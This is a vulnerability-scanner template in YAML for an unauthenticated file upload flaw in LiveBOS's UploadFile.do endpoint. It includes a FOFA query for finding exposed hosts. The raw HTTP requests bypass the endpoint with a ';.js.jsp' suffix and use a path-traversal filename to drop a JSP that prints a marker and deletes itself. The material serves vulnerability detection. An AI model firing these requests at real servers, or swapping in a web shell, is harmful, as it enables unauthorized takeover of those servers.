id: LiveBOS-UploadFile-File-upload

info:
  name: LiveBOS UploadFile.do 任意文件上传漏洞(XVE-2023-21708)
  author: unknown
  severity: high
  description: |-
    fofa: body="Power by LiveBOS"
    LiveBOS UploadFile.do 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/140926931
  tags: File upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /feed/UploadFile.do;.js.jsp HTTP/1.1 
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxegqoxxi

        ------WebKitFormBoundaryxegqoxxi
        Content-Disposition: form-data; name="file"; filename="/../../../../{{username}}.jsp"
        Content-Type: image/jpeg

        <%@ page import="java.io.File" %>
        <%
          out.println("sectestsectest");
          String filePath = application.getRealPath(request.getServletPath());
          new File(filePath).delete();
        %>
        ------WebKitFormBoundaryxegqoxxi--

      
      - |
        GET /{{username}}.jsp;.js.jsp HTTP/1.1
        Host: {{Hostname}}


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'sectestsectest'
      - type: status
        status: 
          - 200